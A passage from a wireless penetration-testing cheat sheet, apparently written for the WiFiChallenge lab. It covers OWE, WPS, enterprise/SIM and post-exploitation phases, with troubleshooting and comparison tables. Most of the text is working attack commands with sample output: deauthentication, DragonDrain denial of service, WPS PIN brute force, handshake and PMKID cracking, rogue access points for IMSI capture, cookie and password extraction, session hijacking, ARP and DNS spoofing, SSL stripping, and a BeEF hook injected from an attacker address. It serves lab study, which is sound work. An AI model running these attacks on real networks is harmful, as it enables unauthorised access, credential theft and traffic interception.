# 2. Identify exact Method
tshark -r recon-01.cap -Y "eap.type == 3" -V | grep "Desired Auth Type"
# Output: Desired Auth Type: UMTS Authentication and Key Agreement' EAP (EAP-AKA') (50)

# 3. Build hostapd with AKA'
nano /etc/hostapd.eap_user
# Content (with TAB):
# *	AKA'

nano hostapd-imsi.conf
```

```conf
interface=wlan4
driver=nl80211
ssid=wifi-passpoint
channel=48
hw_mode=a
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_sim_id=0
eap_sim_db=file:/tmp/sim_db
eap_user_file=/etc/hostapd.eap_user
eap_sim_aka_result_ind=1
```

```bash
# 4. Build fake sim_db
echo "001010000000001 00000000000000000000000000000000 00000000000000000000000000000000" | sudo tee /tmp/sim_db

# 5. Run hostapd
sudo hostapd ~/wifi/hostapd-imsi.conf

# 6. Parallel sniffing
sudo tshark -i wlan1mon -w /tmp/imsi.pcap

# 7. Deauth
sudo aireplay-ng --ignore-negative-one -0 10 -a F0:9F:C2:71:22:19 -c 64:32:A8:BA:18:60 wlan1mon

# 8. Extract IMSI
sudo tshark -r /tmp/imsi.pcap -Y "eap.type == 50" -V | grep -iE "Identity|IMSI"
```

**Output:**
```
Identity: 6214070028194561@wlan.mnc007.mcc214.wifichallenge.com
```

**Final IMSI (remove prefix 6):** `214070028194561`

---

<a name="owe"></a>
## 9. Phase 6: OWE Branch (Enhanced Open)

```
OWE (ENC=WPA3, AUTH=OWE)
│
├── Direct connection (works 99% of the time)
│   ├── key_mgmt=OWE, ieee80211w=2
│   ├── wpa_supplicant + dhclient
│   └── admin/admin → flag
│
└── If it fails:
    ├── DragonDrain (DoS on OWE handshake)
    │   └── dragondrain -d wlan1mon -a <BSSID> -c 44 -r 200
    │
    └── Retry
```

### 9.1. Connect to OWE

```conf
# gratis.conf
network={
    ssid="wifi-gratis"
    key_mgmt=OWE
    ieee80211w=2
    scan_ssid=1
}
```

```bash
sudo wpa_supplicant -Dnl80211 -i wlan3 -c gratis.conf -B
sudo dhclient wlan3 -v
```

### 9.2. DragonDrain (If Connection Fails)

```bash
cd /root/tools/dragondrain-and-time/
autoreconf -i && ./configure && make
cd src/
sudo ./dragondrain -d wlan1mon -a F0:9F:C2:71:AF:2F -c 44 -b 54 -n 1 -r 200
```

---

<a name="wps"></a>
## 10. Phase 7: WPS Branch

```
WPS (WPS column = 2.0)
│
├── 1. Check WPS status
│   └── wash -i wlan0mon -c <CH>
│       ├── Lck = No → continue
│       └── Lck = Yes → reaver -L (ignore lock)
│
├── 2. Pixie Dust (fastest)
│   └── reaver -i wlan0mon -b <BSSID> -c <CH> -vv -K 1
│       ├── success → password + PIN
│       └── failure → PIN Brute-force
│
└── 3. PIN Brute-force
    └── reaver -i wlan0mon -b <BSSID> -c <CH> -vv -S -N -L
        ├── WPS PIN: 12345670
        ├── WPA PSK: @MegaPSKP@ssword!@
        └── Connect with PSK config
```

### 10.1. Check WPS

```bash
sudo wash -i wlan0mon -c 8
```

**Output:**
```
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
F0:9F:C2:71:22:13    8  -30  2.0  No             wifi-event
```

| Column | Meaning | Value |
|------|------|-------|
| WPS | Version | `2.0` = enabled |
| Lck | Locked | `No` = attack possible |

### 10.2. Pixie Dust

```bash
sudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -vv -K 1
```

### 10.3. PIN Brute-force

```bash
sudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -vv -S -N -L
```

**Successful output:**
```
[+] WPS PIN: '12345670'
[+] WPA PSK: '@MegaPSKP@ssword!@'
```

### 10.4. Connect with WPS PSK

```conf
network={
    ssid="wifi-event"
    psk="@MegaPSKP@ssword!@"
}
```

---

<a name="wids"></a>
## 11. Phase 8: WIDS (Nzyme)

```
WIDS (Nzyme)
│
├── 1. Access dashboard
│   └── https://127.0.0.1:22900 (admin:admin)
│
├── 2. Alerts → oldest alert
│
└── 3. Find Source MAC / Attacker MAC
```

---

<a name="post"></a>
## 12. Post-Exploitation

```
After connecting to the network
│
├── 1. Network information
│   ├── ip a show wlan3
│   ├── ip route | grep default
│   └── arp-scan -I wlan3 -l
│
├── 2. Decrypt traffic (WPA2)
│   └── airdecap-ng -e <SSID> -p <PASS> capture-01.cap
│
├── 3. Extract credentials
│   ├── tshark -Y "http.request.method == POST" -T fields -e http.file_data
│   ├── tshark -Y "http.cookie" -T fields -e http.cookie
│   ├── tshark -Y "http.authorization" -T fields -e http.authorization
│   └── tshark -Y "ftp" -T fields -e ftp.request.arg
│
├── 4. Session Hijacking
│   └── curl -i -b "PHPSESSID=..." http://<gateway>/
│
├── 5. Test Client Isolation
│   ├── arp-scan -I wlan3 -l
│   └── curl http://<other_client>/
│
└── 6. MitM attacks (if Client Isolation is disabled)
    ├── ARP Spoofing (bettercap)
    ├── SSL Stripping (bettercap http.proxy.sslstrip)
    ├── DNS Spoofing (bettercap dns.spoof)
    └── JS Injection (BeEF)
```

### 12.1. Cookie Extraction and Session Hijacking

```bash
# 1. Decrypt
airdecap-ng -e wifi-mobile -p starwars1 ~/wifi/scanc6-01.cap

# 2. Extract cookie
tshark -r ~/wifi/scanc6-01-dec.cap -Y "http.cookie" -T fields -e http.cookie
# Output: PHPSESSID=296228e3896440bd508d4c69e11e265c

# 3. Use cookie
curl -i -b "PHPSESSID=296228e3896440bd508d4c69e11e265c" http://192.168.2.1/
```

### 12.2. Extract Credentials from HTTP

```bash
tshark -r capture-dec.cap -Y "http.request.method == \"POST\"" -T fields -e http.file_data
# Output: Username=free1&Password=Jyl1iq8UajZ1fEK&Submit=Login
```

### 12.3. Test Client Isolation

```bash
# 1. Find IPs
sudo arp-scan -I wlan3 -l

# 2. Test access
curl -s -m 3 http://192.168.2.7/ | grep -o 'flag{[^}]*}'
```

### 12.4. MitM Attacks (bettercap)

```bash
# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Run bettercap
sudo bettercap -iface eth0

# In bettercap:
net.probe on
net.show
set arp.spoof.targets 192.168.1.50
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on

# SSL Stripping
set http.proxy.sslstrip true
http.proxy on

# DNS Spoofing
set dns.spoof.address 192.168.1.100
set dns.spoof.domains google.com
dns.spoof on

# BeEF Injection
set http.proxy.injectjs http://YOUR_IP:3000/hook.js
```

---

<a name="cheatsheet"></a>
## 13. Key Command Cheat Sheet

### 13.1. Recon

```bash
# Comprehensive scan
sudo airodump-ng wlan0mon -w scan --manufacturer --wps --band abg

# Targeted scan
sudo airodump-ng wlan0mon -c <CH> --bssid <BSSID> -w target

# Check WPS
sudo wash -i wlan0mon -c <CH>

# Check PMF
sudo iw dev wlan2 scan | grep -A 20 "SSID" | grep -A 6 "RSN"

# Analyze pcap
tshark -r capture.cap -Y "wlan.fc.type_subtype == 4" -T fields -e wlan.sa -e wlan.ssid
tshark -r capture.cap -Y "eap.identity" -T fields -e eap.identity
tshark -r capture.cap -Y "eap.type" -T fields -e eap.type | sort | uniq -c
```

### 13.2. Attacks

```bash
# Deauth
sudo aireplay-ng -0 10 -a <BSSID> -c <CLIENT> wlan0mon

# Handshake
sudo airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0mon

# PMKID
sudo hcxdumptool -i wlan6mon -w pmkid.pcapng -c <CH>a --rds=2 -A

# WPS Pixie Dust
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv -K 1

# WPS PIN Brute-force
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv -S -N -L

# WEP automated
sudo besside-ng -c <CH> -b <BSSID> wlan2 -v

# WEP manual
sudo aireplay-ng -1 3600 -q 10 -a <BSSID> wlan0mon
sudo aireplay-ng --arpreplay -b <BSSID> -h <YOUR_MAC> wlan0mon
sudo aircrack-ng capture-01.cap

# wacker.py (WPA3)
./wacker.py --wordlist rockyou.txt --ssid <SSID> --bssid <BSSID> \
            --interface wlan2 --freq 2462

# DragonDrain (OWE/WPA3 DoS)
sudo ./dragondrain -d wlan1mon -a <BSSID> -c <CH> -b 54 -n 1 -r 200
```

### 13.3. Cracking

```bash
# WPA2 (Handshake/PMKID)
hashcat -m 22000 -a 0 hash.22000 rockyou.txt --force
aircrack-ng capture-01.cap -w rockyou.txt

# WEP
aircrack-ng wep-01.cap

# EAP-MD5
hcxpcapngtool --eapmd5=legacy.hc4800 capture.cap
hashcat -m 4800 -a 0 legacy.hc4800 rockyou.txt

# MSCHAPv2
asleap -C <CHALLENGE> -R <RESPONSE> -W rockyou.txt
hashcat -m 5500 hash.5500 rockyou.txt

# NetNTLMv2
hashcat -m 5600 hash.5600 rockyou.txt
```

### 13.4. Connection

```bash
# OPN
wpa_supplicant -Dnl80211 -iwlan2 -c open.conf
dhclient wlan2 -v

# WEP
wpa_supplicant -Dnl80211 -iwlan2 -c wep.conf
dhclient wlan2 -v

# WPA2-PSK
wpa_supplicant -Dnl80211 -iwlan3 -c psk.conf
dhclient wlan3 -v

# WPA3-SAE
wpa_supplicant -i wlan2 -c wpa3.conf

# WPA2-Enterprise (PEAP)
wpa_supplicant -Dnl80211 -iwlan3 -c corp.conf -B
dhclient wlan3 -v

# OWE
wpa_supplicant -Dnl80211 -i wlan3 -c gratis.conf -B
```

### 13.5. Post-Exploit

```bash
# Decrypt
airdecap-ng -e <SSID> -p <PASS> capture-01.cap

# Extract cookie
tshark -r capture-dec.cap -Y "http.cookie" -T fields -e http.cookie

# Extract POST
tshark -r capture-dec.cap -Y "http.request.method == POST" -T fields -e http.file_data

# Session Hijacking
curl -i -b "PHPSESSID=..." http://<gateway>/

# Client Isolation
arp-scan -I wlan3 -l
curl http://<other_client>/
```

---

<a name="troubleshoot"></a>
## 14. Common Troubleshooting Table

| Error | Cause | Solution |
|------|------|--------|
| `failed to arm interface` | Shared interface | `iw phy phy70 interface add wlan6mon type monitor` |
| `fixed channel -1` | Channel not set | `sudo ip link set wlan0mon down; sudo iw dev wlan0mon set channel 44; sudo ip link set wlan0mon up` |
| `unknown CA` | Client validates certificate | `--negotiate gtc-downgrade` or import real cert |
| `Supplicant used different EAP type` | Wrong method | `tshark -Y "eap.type == 3" -V` → check `Desired Auth Type` |
| `WPS pin not found` | Pixie Dust failed | `reaver -S -N -L` (PIN Brute-force) |
| `Lck: Yes` (WPS Locked) | WPS locked | `reaver -L` or wait |
| `file corrupt` (hashcat) | Hash format | `hcxhash2cap --hccapx=... -c aux.pcap` → `hcxpcapngtool` |
| `RSA key ok` (no password) | Key without password | Remove `--private-key-passwd` |
| `create_ap.all.lock` | Previous process | `sudo rm -f /tmp/create_ap.all.lock` |
| `Address already in use` (port 80) | Apache/nginx | `sudo fuser -k 80/tcp` |
| `wpa_supplicant` hang | Stuck process | `sudo pkill wpa_supplicant; sudo ip link set wlan3 down; sleep 2; up` |
| `dhclient` timeout | DHCP not responding | `sudo dhclient -v -r wlan3` and retry |

### 14.1. Advanced Troubleshooting

```bash
# Check interface status
iw dev wlan0mon info
iwconfig wlan0mon

# Check channel
sudo iw dev wlan0mon set channel 44
iw dev wlan0mon info | grep channel

# Check interference
sudo airmon-ng check
sudo airmon-ng check kill

# Full reset
sudo pkill wpa_supplicant
sudo pkill dhclient
sudo pkill hostapd
sudo pkill dnsmasq
sudo airmon-ng check kill
sudo ip link set wlan0 down
sudo ip link set wlan0 up
```

---

<a name="checklist"></a>
## 15. Final Checklist

### Before Testing:
- [ ] Wireless card tested in Monitor Mode
- [ ] All tools installed: `aircrack-ng`, `hashcat`, `hcxdumptool`, `reaver`, `eaphammer`, `hostapd-mana`, `wacker`, `air-hammer`, `berate_ap`, `wpa_sycophant`, `tshark`
- [ ] Wordlist ready: `/root/rockyou-top100000.txt`
- [ ] Know what `airmon-ng check kill` does

### During Testing:
- [ ] Ran `airodump-ng --band abg` (not just 2.4GHz)
- [ ] Noted target channel and BSSID
- [ ] Identified encryption and AUTH type
- [ ] Checked WPS with `wash`
- [ ] Checked PMF with `iw scan`
- [ ] If MGT, extracted `eap.type`
- [ ] After cracking, ran `airdecap-ng`
- [ ] Extracted cookie/credential from traffic
- [ ] Ran `ip route` and found gateway
- [ ] Ran `arp-scan` for Client Isolation

### Golden Rules:
1. **No automated tools!** (`wifite`, `wifiphisher` are forbidden; `besside-ng` only for WEP)
2. **Always lock the channel** (`-c <CH>`)
3. **PMKID is faster than Handshake**
4. **Check WPS** (fastest path)
5. **Reset before every attack** (`pkill`, `airmon-ng check kill`)
6. **After every connection, run `ip route`**
7. **Analyze every pcap with tshark** (Identity, Certificate, Cookie)

---

<a name="comparison"></a>
## 16. Attack Comparison Table

| Network Type | Main Method | Tool | Time | Difficulty |
|----------|----------|-------|------|------|
| **OPN** | Direct connect | `wpa_supplicant` | 1 min | ⭐ |
| **OPN + Portal** | MAC Spoofing | `macchanger` + `tshark` | 5 min | ⭐⭐ |
| **WEP** | besside-ng | `besside-ng` | 5-10 min | ⭐ |
| **WEP** | Manual | `aireplay-ng` + `aircrack` | 15-30 min | ⭐⭐ |
| **WPA2 + Client** | Deauth + Handshake | `aireplay-ng` + `hashcat` | 2-5 min | ⭐⭐ |
| **WPA2 no Client** | PMKID | `hcxdumptool` + `hashcat` | 1-3 min | ⭐ |
| **WPA2 absent + Probe** | Rogue AP | `hostapd-mana` | 5-10 min | ⭐⭐⭐ |
| **WPA3 Transition** | Downgrade | `hostapd-mana` | 5 min | ⭐⭐⭐ |
| **WPA3-only** | wacker.py | `wacker` | 30-60 min | ⭐⭐⭐⭐ |
| **WPS** | Pixie Dust | `reaver -K 1` | 10 sec | ⭐ |
| **WPS** | PIN Brute-force | `reaver -S -N -L` | 1-4 hours | ⭐⭐⭐ |
| **MGT + MD5** | Passive + Crack | `hcxpcapngtool` | 1 min | ⭐ |
| **MGT + PEAP** | Evil Twin | `eaphammer` | 5-15 min | ⭐⭐⭐ |
| **MGT + PEAP** | Relay | `berate_ap` + `sycophant` | 10 min | ⭐⭐⭐⭐ |
| **MGT + TLS** | Fake cert | `openssl` + `eaphammer` | 5 min | ⭐⭐⭐⭐ |
| **MGT + SIM** | IMSI Extraction | `hostapd` | 5 min | ⭐⭐⭐ |
| **OWE** | Direct connect | `wpa_supplicant` | 1 min | ⭐ |
| **OWE** | DragonDrain | `dragondrain` | 5 min | ⭐⭐⭐ |

---

2026/11/06


